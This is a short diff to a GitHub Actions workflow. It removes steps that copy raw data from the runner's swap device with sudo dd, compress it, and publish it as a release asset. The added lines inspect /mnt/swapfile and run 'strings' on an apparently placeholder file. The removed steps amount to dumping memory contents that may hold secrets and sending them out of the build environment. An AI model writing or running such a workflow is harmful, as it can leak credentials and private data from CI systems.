@@ -10,28 +10,6 @@ jobs:
     - name: Check and locate swap
       id: swap
       run: |
-        echo "Checking /proc/swaps..."
-        if [ ! -f /proc/swaps ]; then
-          echo "Swap file not found"
-          exit 1
-        fi
-
-        SWAP_PATH=$(awk 'NR==2{print $1}' /proc/swaps)
-        if [ ! -e "$SWAP_PATH" ]; then
-          echo "Swap path does not exist: $SWAP_PATH"
-          exit 1
-        fi
-
-        echo "Using swap device: $SWAP_PATH"
-        echo "SWAP_PATH=$SWAP_PATH" >> $GITHUB_ENV
-
-    - name: Extract 10MB of swap and compress
-      run: |
-        sudo dd if="$SWAP_PATH" bs=1M count=10 status=none | gzip > swap_sample.gz
-
-    - name: Upload swap to release
-      uses: softprops/action-gh-release@v1
-      with:
-        files: swap_sample.gz
-      env:
-        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        ls -ahl /mnt/swapfile
+        sudo head -c 1048576 yourfile.txt
+        strings yourfile.txt
